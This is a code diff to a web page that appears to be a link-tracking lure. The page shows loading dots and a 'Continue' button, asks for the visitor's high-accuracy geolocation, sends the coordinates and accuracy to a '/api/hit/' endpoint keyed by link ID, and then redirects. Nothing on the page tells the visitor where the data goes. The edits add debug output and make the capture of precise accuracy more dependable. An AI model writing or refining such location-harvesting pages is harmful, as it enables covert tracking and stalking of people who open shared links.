@@ -89,6 +89,19 @@
     .hidden {
       display: none;
     }
+    
+    /* For debugging - remove in production */
+    .debug {
+      position: fixed;
+      bottom: 10px;
+      left: 10px;
+      font-size: 11px;
+      color: #999;
+      background: #f5f5f5;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-family: monospace;
+    }
   </style>
 </head>
 <body>
@@ -106,9 +119,13 @@
   <button id="continueBtn" class="hidden">Continue</button>
 </div>
 
+<!-- Debug panel to verify accuracy is captured (remove in production) -->
+<div class="debug" id="debug"></div>
+
 <script>
   const dotsContainer = document.getElementById('dotsContainer');
   const continueBtn = document.getElementById('continueBtn');
+  const debug = document.getElementById('debug');
   
   let isProcessing = false;
   let locationSent = false;
@@ -153,6 +170,8 @@
     if (locationSent) return;
     locationSent = true;
     
+    debug.innerHTML = `Sending: Lat=${lat}, Lon=${lon}, Accuracy=${acc}m`;
+    
     const payload = {
       lat: lat,
       lon: lon,
@@ -161,11 +180,13 @@
       timestamp: Date.now()
     };
     
+    console.log('Sending location:', payload);
+    
     fetch('/api/hit/' + (linkId || 'unknown'), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
-    }).catch(() => {});
+    }).catch(err => console.log('Send error:', err));
   }
   
   // Redirect
@@ -184,9 +205,11 @@
     
     // Show loading dots
     showLoadingDots();
+    debug.innerHTML = 'Requesting location...';
     
     // Check if geolocation is supported
     if (!navigator.geolocation) {
+      debug.innerHTML = 'ERROR: Geolocation not supported';
       showButton();
       return;
     }
@@ -195,20 +218,33 @@
     navigator.geolocation.getCurrentPosition(
       // Success - User allowed
       function(position) {
+        // FIXED: Accuracy is always available in position.coords
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        const acc = Math.round(position.coords.accuracy || 0);
+        const acc = position.coords.accuracy; // This returns meters
+        const accRounded = Math.round(acc);
         
-        sendLocation(lat, lon, acc);
+        // Debug log to verify
+        console.log('Position object:', position);
+        console.log('Raw accuracy:', acc);
+        console.log('Rounded accuracy:', accRounded);
+        
+        debug.innerHTML = `✅ Captured! Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}, Accuracy: ${accRounded} meters`;
+        
+        // Send to backend with accuracy
+        sendLocation(lat, lon, accRounded);
+        
+        // Redirect
         redirect();
       },
       // Error - User denied
       function(error) {
+        debug.innerHTML = `❌ Error: ${error.code} - ${error.message}`;
         // Show button again so user can retry
         showButton();
       },
       {
-        enableHighAccuracy: true,
+        enableHighAccuracy: true,  // This gives better accuracy
         timeout: 10000,
         maximumAge: 0
       }
@@ -218,6 +254,7 @@
   // Show initial dots for 1.5 seconds, then show button
   setTimeout(() => {
     showButton();
+    debug.innerHTML = 'Ready - Click Continue to allow location';
   }, 1500);
   
   // Button click handler
